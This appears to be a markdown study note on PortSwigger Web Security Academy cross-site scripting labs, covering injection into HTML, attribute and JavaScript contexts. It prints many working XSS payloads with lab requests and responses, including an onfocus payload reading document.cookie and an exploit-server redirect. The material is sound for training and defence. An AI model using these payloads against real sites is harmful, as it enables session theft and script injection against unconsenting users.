
# XSS Context labs

- [Between HTML Tags](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-between-html-tags)
- [In HTML tag attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-html-tag-attributes)
- [In JavaScript](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)

</br>

## Reflected XSS into HTML context with most tags and attributes blocked
`search=<>`

```HTML
 <section class=blog-header>
    <h1>0 search results for '<>'</h1>
    <hr>
  </section>
```
</br>

## Reflected XSS into HTML context with all tags blocked except custom ones
https://github.com/LinuxUser255/Web-Security-Academy-Series

**Request**
```http
GET /?search=document
```

**Response**
```HTML
<h1>1 search results for 'document'</h1>

```

```html

<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
```

```
This injection creates a custom tag with the ID x,
which contains an onfocus event handler that triggers
the alert function.
The hash at the end of the URL focuses on this element as
soon as the page is loaded, causing the alert payload to
be called.

```
**Payload to be appended to your lab url and stored in the exploit server**

```js
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
```
```html
<script>
location = 'https://labid.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

</br>

## XSS in HTML tag attributes

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

`"><script>alert(document.domain)</script>`

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

`" autofocus onfocus=alert(document.domain) x="`

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup.

</br>

## Reflected XSS into attribute with angle brackets HTML-encoded

```HTTP
GET /?search="onmouseover="alert(1)
```

```HTML
 <form action=/ method=GET>
 <input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
<button type=submit class=button>Search</button>
```

### [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)


Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

`<a href="javascript:alert(document.domain)">`


```HTML
  <p>
   <img src="/resources/images/avatarDefault.svg" class="avatar">                  <a id="author" href="javascript:alert(1)">HACKERMAN
   </a>
</p>
```

1. Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:

    `javascript:alert(1)`


</br>


## XSS into JavaScript

When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.

### Terminating the existing script

In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:

```JS
<script>
   ....
	var input = 'controllable data here';
	...
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own:

```JS
</script><img src=1 onerror=alert(document.domain)>
```

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.

</br>

### XSS into JavaScript lab example  

![xss-js-context-01](https://github.com/LinuxUser255/Web-Security-Academy-Series/assets/46334926/ada27410-d5c2-407d-81b7-07c07bce7c7d)



![xss-js-contex-02](https://github.com/LinuxUser255/Web-Security-Academy-Series/assets/46334926/57d2646f-f742-48bf-ba54-493d28110fb0)


</br>

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded & single quotes escaped

Some applications attempt to prevent input from breaking out of the JavaScript
string by escaping any single quote characters with a backslash.

**A backslash before a character tells the JavaScript parser that
the character should be interpreted literally**,

and not as a special character such as a string
terminator. In this situation, applications often make the mistake of failing to
escape the backslash character itself. This means that an attacker can use their
own backslash character to neutralize the backslash that is added by the
application.

For example, suppose that the input:

`';alert(document.domain)//`

gets converted to:

`\';alert(document.domain)//`

You can now use the alternative payload:

`\';alert(document.domain)//`

which gets converted to:

`\\';alert(document.domain)//`

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. 
This means that the quote is now interpreted as a string terminator, and so the attack succeeds.   

### Reflected XSS into a JavaScript string with single quote and backslash escaped
req
```HTTP
GET /?search=phone HTTP/2
```
resp
```java script
 <script>
    var searchTerms = 'phone';
    document.write('<img src="/resources/images/tracker.gif? 
    searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
req
```HTTP
GET /?search=</script><img src=1 onerror=alert(document.domain)> HTTP/2
```
resp
```js
<script>
     var searchTerms = '</script><img src=1 onerror=alert(document.domain)>';
     document.write('<img src="/resources/images/tracker.gif? 
     searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
The payload `</script><img src=1 onerror=alert(document.domain)>` can be used to break out of the existing JavaScript and execute your own:

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. 

**The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.**




